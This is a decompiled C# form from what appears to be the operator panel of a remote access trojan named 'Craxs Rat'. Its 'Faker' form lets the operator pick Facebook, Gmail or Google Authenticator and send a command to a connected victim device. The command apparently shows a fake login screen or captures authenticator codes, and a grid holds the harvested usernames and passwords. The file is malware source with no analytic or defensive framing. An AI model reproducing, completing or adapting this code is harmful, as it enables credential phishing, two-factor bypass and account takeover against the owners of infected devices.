using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using MetroSet_UI.Controls;
using MetroSet_UI.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000B7 RID: 183
	[DesignerGenerated]
	public partial class Faker : Form
	{
		// Token: 0x06000C49 RID: 3145 RVA: 0x000804B4 File Offset: 0x0007E6B4
		public Faker()
		{
			this.string_1 = "null";
			this.InitializeComponent();
		}

		// Token: 0x17000386 RID: 902
		// (get) Token: 0x06000C4C RID: 3148 RVA: 0x00006564 File Offset: 0x00004764
		// (set) Token: 0x06000C4D RID: 3149 RVA: 0x00080E3C File Offset: 0x0007F03C
		internal virtual DataGridView DataGridView1 { get; set; }

		// Token: 0x17000387 RID: 903
		// (get) Token: 0x06000C4E RID: 3150 RVA: 0x0000656C File Offset: 0x0000476C
		// (set) Token: 0x06000C4F RID: 3151 RVA: 0x00080E50 File Offset: 0x0007F050
		internal virtual DataGridViewTextBoxColumn plat { get; set; }

		// Token: 0x17000388 RID: 904
		// (get) Token: 0x06000C50 RID: 3152 RVA: 0x00006574 File Offset: 0x00004774
		// (set) Token: 0x06000C51 RID: 3153 RVA: 0x00080E64 File Offset: 0x0007F064
		internal virtual DataGridViewTextBoxColumn n { get; set; }

		// Token: 0x17000389 RID: 905
		// (get) Token: 0x06000C52 RID: 3154 RVA: 0x0000657C File Offset: 0x0000477C
		// (set) Token: 0x06000C53 RID: 3155 RVA: 0x00080E78 File Offset: 0x0007F078
		internal virtual DataGridViewTextBoxColumn pass { get; set; }

		// Token: 0x1700038A RID: 906
		// (get) Token: 0x06000C54 RID: 3156 RVA: 0x00006584 File Offset: 0x00004784
		// (set) Token: 0x06000C55 RID: 3157 RVA: 0x00080E8C File Offset: 0x0007F08C
		internal virtual MetroSetComboBox platfromtext { get; set; }

		// Token: 0x1700038B RID: 907
		// (get) Token: 0x06000C56 RID: 3158 RVA: 0x0000658C File Offset: 0x0000478C
		// (set) Token: 0x06000C57 RID: 3159 RVA: 0x00080EA0 File Offset: 0x0007F0A0
		internal virtual Label Label2 { get; set; }

		// Token: 0x1700038C RID: 908
		// (get) Token: 0x06000C58 RID: 3160 RVA: 0x00006594 File Offset: 0x00004794
		// (set) Token: 0x06000C59 RID: 3161 RVA: 0x00080EB4 File Offset: 0x0007F0B4
		internal virtual Label Label1 { get; set; }

		// Token: 0x1700038D RID: 909
		// (get) Token: 0x06000C5A RID: 3162 RVA: 0x0000659C File Offset: 0x0000479C
		// (set) Token: 0x06000C5B RID: 3163 RVA: 0x00080EC8 File Offset: 0x0007F0C8
		internal virtual MetroSetSwitch Checkalert { get; set; }

		// Token: 0x1700038E RID: 910
		// (get) Token: 0x06000C5C RID: 3164 RVA: 0x000065A4 File Offset: 0x000047A4
		// (set) Token: 0x06000C5D RID: 3165 RVA: 0x00080EDC File Offset: 0x0007F0DC
		internal virtual MetroSetButton MetroSetButton1
		{
			[CompilerGenerated]
			get
			{
				return this._MetroSetButton1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.MetroSetButton1_Click);
				MetroSetButton metroSetButton = this._MetroSetButton1;
				if (metroSetButton != null)
				{
					metroSetButton.Click -= value2;
				}
				this._MetroSetButton1 = value;
				metroSetButton = this._MetroSetButton1;
				if (metroSetButton != null)
				{
					metroSetButton.Click += value2;
				}
			}
		}

		// Token: 0x06000C5E RID: 3166 RVA: 0x00080F20 File Offset: 0x0007F120
		private void MetroSetButton1_Click(object sender, EventArgs e)
		{
			if (this.platfromtext.Text.Length < 2)
			{
				Interaction.MsgBox("Select Platform First!!!", MsgBoxStyle.OkOnly, null);
			}
			else if (this.gclass8_0 != null)
			{
				try
				{
					string[] array = this.gclass8_0.string_0.Split(new char[]
					{
						':'
					});
					string text;
					if (this.Checkalert.Switched)
					{
						text = "1:";
					}
					else
					{
						text = "0:";
					}
					if (Operators.CompareString(this.platfromtext.Text, "Facebook", false) == 0)
					{
						text += "fb:fsh";
					}
					else if (Operators.CompareString(this.platfromtext.Text, "Gmail", false) == 0)
					{
						text += "go:fsh";
					}
					else if (Operators.CompareString(this.platfromtext.Text, "google authenticator", false) == 0)
					{
						object[] objects_ = new object[]
						{
							this.object_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"goauth<*>X",
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								"0",
								GClass9.string_0,
								"0",
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_0.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_0
						};
						this.gclass8_0.method_2(objects_);
						return;
					}
					object[] objects_2 = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"msg:",
							text,
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							"0",
							GClass9.string_0,
							"0",
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_0.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_0
					};
					this.gclass8_0.method_2(objects_2);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x040006D9 RID: 1753
		public object object_0;

		// Token: 0x040006DA RID: 1754
		public GClass8 gclass8_0;

		// Token: 0x040006DB RID: 1755
		public string string_0;

		// Token: 0x040006DC RID: 1756
		public string string_1;
	}
}
